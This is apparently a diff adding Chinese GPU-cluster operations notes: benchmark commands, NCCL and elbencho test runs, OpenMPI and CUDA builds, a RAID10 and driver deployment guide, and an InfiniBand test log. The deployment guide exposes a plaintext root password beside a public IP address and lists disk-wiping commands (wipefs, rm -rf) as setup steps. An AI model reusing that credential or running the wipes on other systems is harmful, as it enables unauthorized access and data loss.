+4.    -mexplicit-relocs 
+当STREAM_ARRAY_SIZE太大时，gcc编译会出错，需要使用此选项更改代码链接时的分布。
+p2p测试
+下载软件：wget HYPERLINK https://github.com/NVIDIA/cuda-samples/archive/refs/tags/v11.8.tar.gz normalLink \tdkey cqf40u \tdfe -10 \tdfn https%3A//github.com/NVIDIA/cuda-samples/archive/refs/tags/v11.8.tar.gz \tdfu https://github.com/NVIDIA/cuda-samples/archive/refs/tags/v11.8.tar.gz \tdlt text https://github.com/NVIDIA/cuda-samples/archive/refs/tags/v11.8.tar.gz
+编译：
+make TARGET_ARCH=x86_64  SMS=&quot;80&quot;
+如果报找不到freeimage.h文件，按如下步骤解决
+wget http://downloads.sourceforge.net/freeimage/FreeImage3170.zip
+unzip FreeImage3170.zip
+make && make install
+或者到bandtest下面，修改/root/zhou/packages/bandtest/samples/z/p2pBandwidthLatencyTest/Makefile里面的第37行：37 CUDA_PATH ?= &quot;/usr/local/cuda&quot;，写正确即可执行make编译。
+如果报找不到头文件，p2pBandwidthLatencyTest.cu:15:25: fatal error: helper_cuda.h: No such file or directory
+可以到Makefile里面，修改245行为 INCLUDES  := -I /data/package/data/apps/cuda/10.0/samples/common/inc
+gpuburn测试
+下载地址：HYPERLINK https://github.com/wilicc/gpu-burn normalLink \tdkey 1bjadq \tdfe -10 \tdfn GitHub%20-%20wilicc/gpu-burn%3A%20Multi-GPU%20CUDA%20stress%20test \tdfu https://github.com/wilicc/gpu-burn \tdlf FromPaste \tdlt text GitHub - wilicc/gpu-burn: Multi-GPU CUDA stress test
+make CCPATH=/usr/local/bin CUDAPATH=/usr/local/cuda
+测试
+./gpu_burn -d 3600 
+-d表示测试双精度
+./gpu_burn 500 #测试卡单精度性能
+./gpu_burn -tc 500 #测试tensor core性能
+郑州V100-SXM2-16G
+                                                                                                                                                   RTX 3090
+      12分区
+V100-SXM2-16G
+N32-E
+A100-40G PCIE
+A100-80G nvlink
+双精度
+6611 Gflop/s
+552 Gflop/s
+6059 Gflop/s
+14502 Gflop/s
+16868 Gflop/s
+单精度
+13856  Gflop/s
+18506 Gflop/s
+13424 Gflop/s
+16314 Gflop/s
+17405 Gflop/s
+tensor core
+52764 Gflop/s
+---
+49612 Gflop/s
+81923 Gflop/s
+94583 Gflop/s
+nccl-test：
+配置yum网络源：HYPERLINK https://blog.csdn.net/qq_46162321/article/details/115006096 normalLink \tdkey qhdryn \tdfe -10 \tdfn Centos7%u914D%u7F6Eyum%u6E90%uFF08%u672C%u5730yum%u6E90%u548C%u963F%u91CC%u7F51%u7EDCyum%u6E90%uFF09_centos7yum%u6E90%u914D%u7F6E_%u8DD1%u4E0D%u5B8C%u7684%u811A%u672C%u7684%u535A%u5BA2-CSDN%u535A%u5BA2 \tdfu https://blog.csdn.net/qq_46162321/article/details/115006096 \tdlf FromPaste \tdlt text Centos7配置yum源（本地yum源和阿里网络yum源）_centos7yum源配置_跑不完的脚本的博客-CSDN博客
+HYPERLINK https://blog.csdn.net/qq_26129413/article/details/110402238 normalLink \tdkey 1zk0wa \tdfe -10 \tdfn %u83B7%u53D6YUM%u6E90%u7684%u4E09%u79CD%u65B9%u6CD5%uFF0C%u4E00%u7BC7%u5C31%u591F_%u67E5%u770B%u5F53%u524Dyum%u6E90_king%20config%u7684%u535A%u5BA2-CSDN%u535A%u5BA2 \tdfu https://blog.csdn.net/qq_26129413/article/details/110402238 \tdlf FromPaste \tdlt text 获取YUM源的三种方法，一篇就够_查看当前yum源_king config的博客-CSDN博客
+显示GID
+show_gids 
+DEVPORTINDEXGIDIPv4  VERDEV
+---------------------------  ------
+mlx5_010fe80:0000:0000:0000:b83f:d203:0051:e7dcv1
+mlx5_110fe80:0000:0000:0000:b83f:d203:0051:e814v1
+n_gids_found=2
+nccl编译：
+make -j 4 src.build NVCC_GENCODE=&quot;-gencode=arch=compute_70,code=sm_70&quot;  CUDA_HOME=/data/apps/cuda
+nccl-tests编译：
+make MPI=1 MPI_HOME=/data/apps/openmpi CUDA_HOME=/data/apps/cuda NCCL_HOME=/data/package/nccl-master/build
+跑单节点all_reduce_per
+./all_reduce_perf -b 8 -e 1G -f 2 -g 8   #1G这里可以设置成其他的块大小，比如256M
+跑多节点all_reduce_per
+mpirun -x LD_LIBRARY_PATH -x PATH -x NCCL_IB_HCA=mlx5_0:1,mlx5_1:1,mlx5_3:1,mlx5_4:1,mlx5_5:1 -x NCCL_IB_DISABLE=0 -x NCCL_ALGO=Ring -H /root/run/apps/conf/hostlist21-30 --allow-run-as-root --mca btl ^tcp all_reduce_perf -b 8 -e 1G -f 2 -g 8
+mpirun -x LD_LIBRARY_PATH -x PATH -x NCCL_IB_HCA=mlx5_0:1,mlx5_1:1,mlx5_3:1,mlx5_4:1,mlx5_5:1 -x NCCL_IB_DISABLE=0 -x NCCL_ALGO=Ring -H /root/run/apps/conf/hostlist21-30 --allow-run-as-root --mca btl ^tcp all_reduce_perf -b 8 -e 1G -f 2 -g 8
+在slurm集群跑示例
+#!/bin/bash
+export PATH=/ssd/apps/openmpi-4.1.2/install/bin:/ssd/apps/nccl-tests-master/build:$PATH
+export LD_LIBRARY_PATH=/ssd/apps/openmpi-4.1.2/install/lib:$LD_LIBRARY_PATH
+export LD_LIBRARY_PATH=/ssd/apps/nccl/build/lib:$LD_LIBRARY_PATH
+export NCCL_IB_HCA=mlx5_0:1,mlx5_1:1,mlx5_4:1,mlx5_5:1
+export NCCL_IB_DISABLE=0
+export NCCL_SOCKET_IFNAME=bond0
+cat /dev/null > hostfile
+for host in $(scontrol show hostnames); do
+        MPI_HOSTS=&quot;${host} slots=8&quot;
+        echo -e &quot;$MPI_HOSTS&quot; >> hostfile
+done
+mpirun -x LD_LIBRARY_PATH -x PATH -x NCCL_IB_HCA=mlx5_0:1,mlx5_1:1,mlx5_4:1,mlx5_5:1 -x NCCL_IB_DISABLE=0 -x NCCL_ALGO=Ring --mca btl ^tcp --hostfile hostfile all_reduce_perf b 8 -e 8G -f 2 -g 1
+#!/bin/bash
+export PATH=/ssd/apps/openmpi-4.1.2/install/bin:/ssd/apps/nccl-tests-master/build:$PATH
+export LD_LIBRARY_PATH=/ssd/apps/openmpi-4.1.2/install/lib:$LD_LIBRARY_PATH
+export LD_LIBRARY_PATH=/ssd/apps/nccl/build/lib:$LD_LIBRARY_PATH
+export NCCL_IB_HCA=mlx5_0:1,mlx5_1:1,mlx5_4:1,mlx5_5:1
+export NCCL_IB_DISABLE=0
+export NCCL_SOCKET_IFNAME=bond0
+cat /dev/null > hostfile
+for host in $(scontrol show hostnames); do
+        MPI_HOSTS=&quot;${host} slots=8&quot;
+        echo -e &quot;$MPI_HOSTS&quot; >> hostfile
+done
+mpirun -x LD_LIBRARY_PATH -x PATH -x NCCL_IB_HCA=mlx5_0:1,mlx5_1:1,mlx5_4:1,mlx5_5:1 -x NCCL_IB_DISABLE=0 -x NCCL_ALGO=Ring --mca btl ^tcp --hostfile hostfile all_reduce_perf b 8 -e 8G -f 2 -g 1
+#这里的NCCL_IB_GID_INDEX 要根据show_gids来设置，如果是2，可以不用设置该命令。
+跑单节点all_gather_per
+./all_gather_perf -b 8 -e 1G -f 2 -g 8
+跑多节点all_gather_per
+mpirun -x LD_LIBRARY_PATH -x PATH -x NCCL_IB_HCA=mlx5_0:1 -x NCCL_IB_DISABLE=0 -x NCCL_IB_GID_INDEX=2 -x NCCL_ALGO=Ring -H A800GPU04,A800GPU05 --allow-run-as-root --mca btl ^tcp all_gather_perf -b 8 -e 1G -f 2 -g 8
+跑单节点reduce_scatter_perf
+./reduce_scatter_perf -b 8 -e 1G -f 2 -g 8
+跑多节点reduce_scatter_perf
+mpirun -x LD_LIBRARY_PATH -x PATH -x NCCL_IB_HCA=mlx5_0:1 -x NCCL_IB_DISABLE=0 -x NCCL_IB_GID_INDEX=2 -x NCCL_ALGO=Ring -H A800GPU04,A800GPU05 --allow-run-as-root --mca btl ^tcp reduce_scatter_perf -b 8 -e 1G -f 2 -g 8
+PS：企业微文档换行 ALT + ENTER
+存储测试：
+安装参考：HYPERLINK https://github.com/breuner/elbencho normalLink \tdkey xteqdj \tdfe -10 \tdfn GitHub%20-%20breuner/elbencho%3A%20A%20distributed%20storage%20benchmark%20for%20file%20systems%2C%20object%20stores%20%26amp%3B%20block%20devices%20with%20support%20for%20GPUs \tdfu https://github.com/breuner/elbencho \tdlf FromPaste \tdlt text GitHub - breuner/elbencho: A distributed storage benchmark for file systems, object stores &amp; block devices with support for GPUs
+yum install boost-devel gcc-c++ git libaio-devel make ncurses-devel numactl-devel rpm-build
+yum install centos-release-scl # for CentOS
+yum install devtoolset-8 
+scl enable devtoolset-8 bash # alternatively: source /opt/rh/devtoolset-8/enable
+再安装elbencho
+git clone https://github.com/breuner/elbencho.git 
+cd elbencho
+make -j $(nproc)
+编译完成后，在各自节点执行elbencho --service 开启服务，否则会报错
+测试命令：
+先mkdir IO.test
+elbencho --hosts  A800GPU11,A800GPU13  --threads 8 --files 1 --size 50G --block 1M --dirsharing --mkdirs --sync --write --read --delfiles --direct ./IO.test
+elbencho --hosts  A800GPU11,A800GPU13  --threads 8 --files 1 --size 50G --block 1M --dirsharing --mkdirs --sync --write --read --delfiles --direct ./IO.test
+里面参数含义可以参考：HYPERLINK https://www.glennklockwood.com/benchmarks/elbencho.html normalLink \tdkey zirl61 \tdfe -10 \tdfn Getting%20Started%20with%20elbencho \tdfu https://www.glennklockwood.com/benchmarks/elbencho.html \tdlf FromPaste \tdlt text Getting Started with elbencho
+在centos下安装openmpi的时候，会遇到以下报错：
+解决方案：1、下载m4包，wget wget HYPERLINK http://ftp.gnu.org/gnu/m4/m4-1.4.9.tar.gz normalLink \tdfe -10 \tdfn http%3A//ftp.gnu.org/gnu/m4/m4-1.4.9.tar.gz \tdfu http://ftp.gnu.org/gnu/m4/m4-1.4.9.tar.gz \tdlf FromInput \tdlt text http://ftp.gnu.org/gnu/m4/m4-1.4.9.tar.gz 然后解压，./configure --prefix=/usr && make && make install
+2、rpm -qa|grep autoconf && rpm -qa|grep automake 查看已有的autoconf版本和automake版本，如果autoconf版本达标，则升级automake版本即可。
+3、升级automake版本，wget HYPERLINK https://github.com/autotools-mirror/automake/archive/refs/tags/v1.15.tar.gz normalLink \tdkey 26qy7x \tdfe -10 \tdfn https%3A//github.com/autotools-mirror/automake/archive/refs/tags/v1.15.tar.gz \tdfu https://github.com/autotools-mirror/automake/archive/refs/tags/v1.15.tar.gz \tdlt text https://github.com/autotools-mirror/automake/archive/refs/tags/v1.15.tar.gz
+yum install autoconf && yum groupinstall perl* && yum install texinfo && yum install flex
+再./bootstrap && ./configure --prefix=/usr && make && make install
+集群pdsh使用技巧
+HYPERLINK https://www.cnblogs.com/goldenblade/p/9604642.html normalLink \tdkey 5gipk1 \tdfe -10 \tdfn %u8FD0%u7EF4%u5DE5%u5177pssh%u548Cpdsh%u5B89%u88C5%u548C%u4F7F%u7528%20-%20Robin%u6C49%20-%20%u535A%u5BA2%u56ED \tdfu https://www.cnblogs.com/goldenblade/p/9604642.html \tdlf FromPaste \tdlt text 运维工具pssh和pdsh安装和使用 - Robin汉 - 博客园
+使用方法示例：pdsh -R ssh -w ^hostlist date
+如果不加-R ssh，会报错
+gcc编译：
+1、cd 到gcc source dir 然后执行./contrib/download_prerequisites，这一步是为了下载一些附属模块。
+2、然后在source dir 外新建build目录，在目录里面执行
+../gcc-9.4.0/configure --prefix=/data/apps/gcc --enable-languages=c,c++,objc,obj-c++,fortran --disable-multilib --disable-checking
+3、make -j12 && make install -j12
+===== /root/conf/chengdu_部署步骤.md (8822B)
+# 成都分区(chengdu) Ubuntu 22.04 集群部署步骤
+
+## 前置条件
+- 远程机器：Ubuntu 22.04 系统
+- 已上传 `/root/conf` 目录（包含所有脚本文件）
+- 机器所在分区：**chengdu**
+
+---
+
+## 一、登录信息
+```
+公网IP：待填写
+账号：root
+端口：22
+密码：待填写
+```
+
+---
+
+## 二、部署步骤
+
+### 步骤0：RAID10配置（前置步骤）
+
+> **说明**：此步骤在安装驱动之前执行，用于配置4块NVMe SSD的RAID10阵列
+
+#### 0.1 上传conf目录到远程机器
+
+**本地Windows环境使用pscp上传：**
+```bash
+# 使用PuTTY的pscp工具
+pscp -P 22 -pw "密码" -r "本地conf目录路径" root@IP:/root/
+
+# 示例
+pscp -P 22 -pw "Tranq@20260331" -r "E:\常用文件\集群测试项目\乌班图集群交付脚本集和\conf" root@61.161.168.30:/root/
+```
+
+#### 0.2 设置脚本权限
+```bash
+chmod -R 755 /root/conf
+```
+
+#### 0.3 查看当前磁盘状态
+```bash
+lsblk
+```
+
+**预期输出示例：**
+```
+NAME        MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
+nvme0n1     259:0    0   3.5T  0 disk
+└─nvme0n1p1 259:2    0   3.5T  0 part /home/nvme01
+nvme1n1     259:1    0   3.5T  0 disk
+└─nvme1n1p1 259:3    0   3.5T  0 part /home/nvme02
+nvme2n1     259:5    0   3.5T  0 disk
+└─nvme2n1p1 259:7    0   3.5T  0 part /home/nvme03
+nvme3n1     259:4    0   3.5T  0 disk
+└─nvme3n1p1 259:6    0   3.5T  0 part /home/nvme04
+```
+
+#### 0.4 卸载现有NVMe挂载点
+```bash
+# 卸载所有NVMe挂载
+umount /home/nvme01
+umount /home/nvme02
+umount /home/nvme03
+umount /home/nvme04
+```
+
+#### 0.5 删除挂载目录
+```bash
+rm -rf /home/nvme01 /home/nvme02 /home/nvme03 /home/nvme04
+```
+
+#### 0.6 清除NVMe分区表
+```bash
+# 清除所有4块NVMe盘的分区表
+wipefs --all /dev/nvme0n1
+wipefs --all /dev/nvme1n1
+wipefs --all /dev/nvme2n1
+wipefs --all /dev/nvme3n1
+```
+
+#### 0.7 执行raid10.sh创建RAID10
+```bash
+cd /root/conf
+bash raid10.sh
+```
+
+**脚本执行内容：**
+- 创建RAID10阵列 `/dev/md0`
+- 格式化为ext4文件系统
+- 创建挂载点 `/ssd`
+- 配置开机自动挂载
+- 配置mdadm
+- 设置同步速度限制
+
+#### 0.8 验证RAID10状态
+```bash
+# 查看磁盘状态
+lsblk
+
+# 查看RAID状态
+cat /proc/mdstat
+
+# 查看挂载
+df -h /ssd
+
+# 查看RAID详情
+mdadm --detail /dev/md0
+```
+
+**预期结果：**
+- `/dev/md0` 大小约 **7.0TB**
+- RAID状态显示 `[UUUU]`（4块盘全部正常）
+- 挂载点 `/ssd`
+
+---
+
+### 步骤1：卸载旧版本NVIDIA驱动（如已安装）
+
+```bash
+# 检查现有驱动
+nvidia-smi
+dpkg -l | grep nvidia
+
+# 卸载nvidia-fabricmanager（如存在）
+dpkg -l | grep nvidia-fabricmanager
+apt remove --purge nvidia-fabricmanager-535 -y  # 根据实际版本调整
+
+# 卸载NVIDIA驱动
+nvidia-uninstall -s
+```
+
+---
+
+### 步骤2：修改脚本配置
+
+#### 2.1 修改 installnvidiadriver.sh 默认版本
+```bash
+# 修改默认驱动版本（如需安装580版本）
+sed -i 's/550.90.07/580.105.08/g' /root/conf/installnvidiadriver.sh
+```
+
+#### 2.2 修改 rclocal.sh 使用 chengdu 配置
+```bash
+# 将 rclocal.sh 中的 cp $conf_dir/rc.local 改为 cp $conf_dir/rc_chengdu.local
+sed -i 's|cp $conf_dir/rc.local /etc/rc.local|cp $conf_dir/rc_chengdu.local /etc/rc.local|' /root/conf/rclocal.sh
+```
+
+---
+
+### 步骤3：重启机器
+```bash
+reboot
+```
+
+> 等待约5-10分钟后重新连接
+
+---
+
+### 步骤4：执行基础配置脚本
+
+```bash
+cd /root/conf
+
+# 4.1 GRUB配置
+bash grub.sh
+
+# 4.2 禁用自动更新
+# 注意：如果执行apt-get install openssh-client时有交互对话，选择"保持当前版本"
+DEBIAN_FRONTEND=noninteractive bash disableupdate.sh
+
+# 4.3 禁用nouveau驱动
+bash disablenouveau.sh
+
+# 4.4 CPU性能模式
+bash cpu_performance.sh
+
+# 4.5 安装编译依赖
+bash installpackage.sh
+```
+
+---
+
+### 步骤5：安装NVIDIA驱动
+
+```bash
+cd /root/conf
+
+# 安装NVIDIA 580驱动 + Fabric Manager
+# 使用gcc-11避免编译问题
+CC=gcc-11 bash installnvidiadriver.sh 580.105.08
+
+# 验证安装
+nvidia-smi
+systemctl status nvidia-fabricmanager.service
+```
+
+---
+
+### 步骤6：安装CUDA
+
+```bash
+cd /root/conf
+
+# 安装CUDA 12.8
+bash cuda.sh
+
+# 验证安装
+/usr/local/cuda-12.8/bin/nvcc --version
+```
+
+---
+
+### 步骤7：配置rc.local
+
+```bash
+cd /root/conf
+
+# 执行rclocal.sh（使用rc_chengdu.local）
+bash rclocal.sh
+
+# 验证
+systemctl status rc-local.service
+cat /etc/rc.local
+```
+
+---
+
+### 步骤8：安装监控组件
+
+```bash
+cd /root/conf
+
+# 安装IDS监控
+bash ids.sh
+
+# 或者手动安装
+cd /root/ids-bare-metal-mon-installer.gnode.ubuntu
+sudo ./gnode-install
+sudo ./gnode-setup-1s
+sudo ./gnode-check
+```
+
+---
+
+### 步骤9：安装Environment Modules
+
+```bash
+cd /root/conf
+===== /root/conf/openmpi缂栬瘧浠ュ強modulefiles缂栧啓.md (4421B)
+1、cuda编译和安装(源码纯命令行安装)
+./cuda_12.1.0_530.30.02_linux.run --toolkit --toolkitpath=/data/apps/cuda/12.1 --librarypath=/data/apps/cuda/12.1 --samples --samplespath=/data/apps/cuda/12.1 --tmpdir=/tmp --silent
+执行结束后，安装路径在/data/apps/cuda/12.1
+
+
+2、openmpi结合cuda安装(cuda-aware模式)
+先决条件，需安装好cuda和ucx
+cuda安装方式见步骤1,如果在/usr/bin目录下有ucx_info，可以执行ucx_info -v来查看版本信息。系统如已安装ucx那么可以不用再重复安装ucx，如果没有则需要执行以下命令进行安装ucx
+./autogen.sh && ./contrib/configure-release --enable-mt --prefix=/data/apps/ucx --with-cuda=/data/apps/cuda/12.1 && make -j4 && make install
+
+
+3、openmpi安装方法：
+注意：如果没有部署在slurm调度系统集群里面，可以不加--with-slurm，否则建议加上。
+./configure --enable-orterun-prefix-by-default \
+--enable-mpirun-prefix-by-default \ 
+--enable-mpi-cxx --without-verbs \ 
+--with-ucx=/data/apps/ucx \ 
+--with-cuda=/data/apps/cuda/12.1 --disable-getpwuid --with-slurm \
+--prefix=/data/apps/openmpi
+接下来执行：
+make -j 8
+make install -j 8
+
+
+4、module组件安装
+#for ubuntu
+apt-get install environment-modules
+#for centos
+yum install environment-modules
+
+
+5、将modulefiles路径加.modulespath文件里面
+/usr/share/modules/init/.modulespath (for ubuntu)
+/usr/share/Modules/init/.modulespath (for centos)
+.modulespath文件内容示例如下：
+/etc/environment-modules/modules
+/usr/share/modules/versions				# location of version files
+/usr/share/modules/$MODULE_VERSION/modulefiles	# Module pkg modulefiles (if versioning)
+/usr/share/modules/modulefiles				# General module files
+/data/apps/modulefiles                      #add yourself modulefiles path
+此处我们想要将module文件存放路径放在/data/apps/modulefiles，那么就将该路径编辑进.modulespath文件里面。
+
+
+6、声明环境变量
+最后source /usr/share/modules/init/profile.sh （for ubuntu）
+source /usr/share/Modules/init/bash_completion (for centos)
+
+
+7、编写具体软件的module文件
+以cuda/12.1为例:
+文件路径:/data/apps/modulefiles/cuda
+文件名称:12.1
+跟cuda12.1相关的modulefiles具体内容示例如下：
+#%Module######################################################################
+###
+###      cuda software modulefile
+###
+
+
+proc ModulesHelp { } {
+        puts stderr "\t cuda/12.1"
+        puts stderr "\t usage: \$ nvcc -h"
+}
+
+module-whatis "For more information, \$ module help cuda/12.1"
+#设置只能同时调用1个cuda，如果存在多个cuda则告警"有cuda版本冲突错误"，引导正确加载使用cuda
+conflict cuda
+#设置CUDA的家目录
+set CUDA_PATH /data/apps/cuda/12.1
+setenv CUDA_HOME ${CUDA_PATH}
+#设置CUDA的PATH(应用程序路径)、LD_LIBRARY_PATH(动态库路径)、LIBRARY_PATH(静态库路径)、CPATH(头文件路径)
+prepend-path CUDA_HOME ${CUDA_PATH}
+prepend-path CUDA_PATH ${CUDA_PATH}
+prepend-path LD_LIBRARY_PATH ${CUDA_PATH}/lib64
+prepend-path LIBRARY_PATH ${CUDA_PATH}/lib64
+prepend-path LD_LIBRARY_PATH ${CUDA_PATH}/libnvvp
+prepend-path LIBRARY_PATH ${CUDA_PATH}/libnvvp
+prepend-path CPATH ${CUDA_PATH}/include
+prepend-path C_INCLUDE_PATH ${CUDA_PATH}/include
+prepend-path PATH ${CUDA_PATH}/bin
+prepend-path CUDA_ROOT ${CUDA_PATH}
+
+以openmpi为例
+文件路径:/data/apps/modulefiles/openmpi
+文件名:4.1.1
+跟openmpi4.1.1相关的modulefiles具体内容示例如下：
+#%Module######################################################################
+##
+##         openmpi software
+##
+
+
+proc ModulesHelp { } {
+    puts stderr "openmpi-4.1.1 - loads the environment of openmpi\n"
+}
+#因为openmpi是基于cuda编译过来的，所以需要加上cuda/12.1，此处不需要加ucx，因为系统里面有ucx，会自动识别并调用。
+module load cuda/12.1
+set     version          4.1.1
+set     root_path        /data/apps/openmpi/4.1.1
+prepend-path    PATH                    ${root_path}/bin
+prepend-path    LD_LIBRARY_PATH         ${root_path}/lib
+
+
+8、最后执行module avail 可以看到
+root@g0010:~# module avail cuda
+-------------- /data/apps/modulefiles ----------------
+cuda/12.1  
+
+PS：加载使用cuda/12.1,可以执行module load cuda/12.1,如需卸载环境则执行module unload cuda/12.1
+
+===== /root/conf/openmpi编译以及modulefiles编写.md (4421B)
+1、cuda编译和安装(源码纯命令行安装)
+./cuda_12.1.0_530.30.02_linux.run --toolkit --toolkitpath=/data/apps/cuda/12.1 --librarypath=/data/apps/cuda/12.1 --samples --samplespath=/data/apps/cuda/12.1 --tmpdir=/tmp --silent
+执行结束后，安装路径在/data/apps/cuda/12.1
+
+
+2、openmpi结合cuda安装(cuda-aware模式)
+先决条件，需安装好cuda和ucx
+cuda安装方式见步骤1,如果在/usr/bin目录下有ucx_info，可以执行ucx_info -v来查看版本信息。系统如已安装ucx那么可以不用再重复安装ucx，如果没有则需要执行以下命令进行安装ucx
+./autogen.sh && ./contrib/configure-release --enable-mt --prefix=/data/apps/ucx --with-cuda=/data/apps/cuda/12.1 && make -j4 && make install
+
+
+3、openmpi安装方法：
+注意：如果没有部署在slurm调度系统集群里面，可以不加--with-slurm，否则建议加上。
+./configure --enable-orterun-prefix-by-default \
+--enable-mpirun-prefix-by-default \ 
+--enable-mpi-cxx --without-verbs \ 
+--with-ucx=/data/apps/ucx \ 
+--with-cuda=/data/apps/cuda/12.1 --disable-getpwuid --with-slurm \
+--prefix=/data/apps/openmpi
+接下来执行：
+make -j 8
+make install -j 8
+
+
+4、module组件安装
+#for ubuntu
+apt-get install environment-modules
+#for centos
+yum install environment-modules
+
+
+5、将modulefiles路径加.modulespath文件里面
+/usr/share/modules/init/.modulespath (for ubuntu)
+/usr/share/Modules/init/.modulespath (for centos)
+.modulespath文件内容示例如下：
+/etc/environment-modules/modules
+/usr/share/modules/versions				# location of version files
+/usr/share/modules/$MODULE_VERSION/modulefiles	# Module pkg modulefiles (if versioning)
+/usr/share/modules/modulefiles				# General module files
+/data/apps/modulefiles                      #add yourself modulefiles path
+此处我们想要将module文件存放路径放在/data/apps/modulefiles，那么就将该路径编辑进.modulespath文件里面。
+
+
+6、声明环境变量
+最后source /usr/share/modules/init/profile.sh （for ubuntu）
+source /usr/share/Modules/init/bash_completion (for centos)
+
+
+7、编写具体软件的module文件
+以cuda/12.1为例:
+文件路径:/data/apps/modulefiles/cuda
+文件名称:12.1
+跟cuda12.1相关的modulefiles具体内容示例如下：
+#%Module######################################################################
+###
+###      cuda software modulefile
+###
+
+
+proc ModulesHelp { } {
+        puts stderr "\t cuda/12.1"
+        puts stderr "\t usage: \$ nvcc -h"
+}
+
+module-whatis "For more information, \$ module help cuda/12.1"
+#设置只能同时调用1个cuda，如果存在多个cuda则告警"有cuda版本冲突错误"，引导正确加载使用cuda
+conflict cuda
+#设置CUDA的家目录
+set CUDA_PATH /data/apps/cuda/12.1
+setenv CUDA_HOME ${CUDA_PATH}
+#设置CUDA的PATH(应用程序路径)、LD_LIBRARY_PATH(动态库路径)、LIBRARY_PATH(静态库路径)、CPATH(头文件路径)
+prepend-path CUDA_HOME ${CUDA_PATH}
+prepend-path CUDA_PATH ${CUDA_PATH}
+prepend-path LD_LIBRARY_PATH ${CUDA_PATH}/lib64
+prepend-path LIBRARY_PATH ${CUDA_PATH}/lib64
+prepend-path LD_LIBRARY_PATH ${CUDA_PATH}/libnvvp
+prepend-path LIBRARY_PATH ${CUDA_PATH}/libnvvp
+prepend-path CPATH ${CUDA_PATH}/include
+prepend-path C_INCLUDE_PATH ${CUDA_PATH}/include
+prepend-path PATH ${CUDA_PATH}/bin
+prepend-path CUDA_ROOT ${CUDA_PATH}
+
+以openmpi为例
+文件路径:/data/apps/modulefiles/openmpi
+文件名:4.1.1
+跟openmpi4.1.1相关的modulefiles具体内容示例如下：
+#%Module######################################################################
+##
+##         openmpi software
+##
+
+
+proc ModulesHelp { } {
+    puts stderr "openmpi-4.1.1 - loads the environment of openmpi\n"
+}
+#因为openmpi是基于cuda编译过来的，所以需要加上cuda/12.1，此处不需要加ucx，因为系统里面有ucx，会自动识别并调用。
+module load cuda/12.1
+set     version          4.1.1
+set     root_path        /data/apps/openmpi/4.1.1
+prepend-path    PATH                    ${root_path}/bin
+prepend-path    LD_LIBRARY_PATH         ${root_path}/lib
+
+
+8、最后执行module avail 可以看到
+root@g0010:~# module avail cuda
+-------------- /data/apps/modulefiles ----------------
+cuda/12.1  
+
+PS：加载使用cuda/12.1,可以执行module load cuda/12.1,如需卸载环境则执行module unload cuda/12.1
+
+===== /root/conf/addiptoyaml.txt (108B)
+ip addr add 10.254.15.26/24 dev  ensxxxx   ip link set ensxxx up    ip route add default via 10.254.15.254  ===== /root/conf/ib_test_log.txt (92887B)
+IB Bandwidth Test Log
+======================
+Starting IB write bandwidth test from 10.11.61.2 to 10.11.61.1...
+Server output from 10.11.61.1:
+Warning: Permanently added '10.11.61.1' (ED25519) to the list of known hosts.
+
+ Found Incompatibility issue with GID types.
+ Please Try to use a different IP version.
+
+
+************************************
+* Waiting for client to connect... *
+************************************
+---------------------------------------------------------------------------------------
+                    RDMA_Write BW Test
+ Dual-port       : OFF		Device         : mlx5_0
+ Number of qps   : 2		Transport type : IB
+ Connection type : RC		Using SRQ      : OFF
+ PCIe relax order: ON
+ ibv_wr* API     : ON
+ CQ Moderation   : 100
+ Mtu             : 4096[B]
+ Link type       : Ethernet
+ GID index       : 3
+ Max inline data : 0[B]
+ rdma_cm QPs	 : OFF
+ Data ex. method : Ethernet
+---------------------------------------------------------------------------------------
+Client output from 10.11.61.2:
+
+ Found Incompatibility issue with GID types.
+ Please Try to use a different IP version.
+
+---------------------------------------------------------------------------------------
+                    RDMA_Write BW Test
+ Dual-port       : OFF		Device         : mlx5_0
+ Number of qps   : 2		Transport type : IB
+ Connection type : RC		Using SRQ      : OFF
+ PCIe relax order: ON
+ ibv_wr* API     : ON
+ TX depth        : 128
+ CQ Moderation   : 100
+ Mtu             : 4096[B]
+ Link type       : Ethernet
+ GID index       : 3
+ Max inline data : 0[B]
+ rdma_cm QPs	 : OFF
+ Data ex. method : Ethernet
+---------------------------------------------------------------------------------------
+------------------------------------------------
+Starting IB write bandwidth test from 10.11.61.3 to 10.11.61.1...
+Server output from 10.11.61.1:
+
+ Found Incompatibility issue with GID types.
+ Please Try to use a different IP version.
+
+
+************************************
+* Waiting for client to connect... *
+************************************
+---------------------------------------------------------------------------------------
+                    RDMA_Write BW Test
+ Dual-port       : OFF		Device         : mlx5_0
+ Number of qps   : 2		Transport type : IB
+ Connection type : RC		Using SRQ      : OFF
+ PCIe relax order: ON
+ ibv_wr* API     : ON
+ CQ Moderation   : 100
+ Mtu             : 4096[B]
+ Link type       : Ethernet
+ GID index       : 3
+ Max inline data : 0[B]
+ rdma_cm QPs	 : OFF
+ Data ex. method : Ethernet
+---------------------------------------------------------------------------------------
+Client output from 10.11.61.3:
+Warning: Permanently added '10.11.61.3' (ED25519) to the list of known hosts.
+
+ Found Incompatibility issue with GID types.
+ Please Try to use a different IP version.
+
+---------------------------------------------------------------------------------------
+                    RDMA_Write BW Test
+ Dual-port       : OFF		Device         : mlx5_0
+ Number of qps   : 2		Transport type : IB
+ Connection type : RC		Using SRQ      : OFF
+ PCIe relax order: ON
+ ibv_wr* API     : ON
+ TX depth        : 128
+ CQ Moderation   : 100
+ Mtu             : 4096[B]
+ Link type       : Ethernet
+ GID index       : 3
+ Max inline data : 0[B]
+ rdma_cm QPs	 : OFF
+ Data ex. method : Ethernet
+---------------------------------------------------------------------------------------
+------------------------------------------------
+Starting IB write bandwidth test from 10.11.61.4 to 10.11.61.1...
+Server output from 10.11.61.1:
+Failed to modify QP 426 to RTR
+ Unable to Connect the HCA's through the link
+
+************************************
+* Waiting for client to connect... *
+************************************
+---------------------------------------------------------------------------------------
+                    RDMA_Write BW Test
+ Dual-port       : OFF		Device         : mlx5_0
+ Number of qps   : 2		Transport type : IB
+ Connection type : RC		Using SRQ      : OFF
+ PCIe relax order: ON
+ ibv_wr* API     : ON
+ CQ Moderation   : 100
+ Mtu             : 4096[B]
+ Link type       : Ethernet
+ GID index       : 3
+ Max inline data : 0[B]
+ rdma_cm QPs	 : OFF
+ Data ex. method : Ethernet
+---------------------------------------------------------------------------------------
+Client output from 10.11.61.4:
+Warning: Permanently added '10.11.61.4' (ED25519) to the list of known hosts.
+Failed to modify QP 294 to RTR
+ Unable to Connect the HCA's through the link
+---------------------------------------------------------------------------------------
+                    RDMA_Write BW Test
+ Dual-port       : OFF		Device         : mlx5_0
+ Number of qps   : 2		Transport type : IB
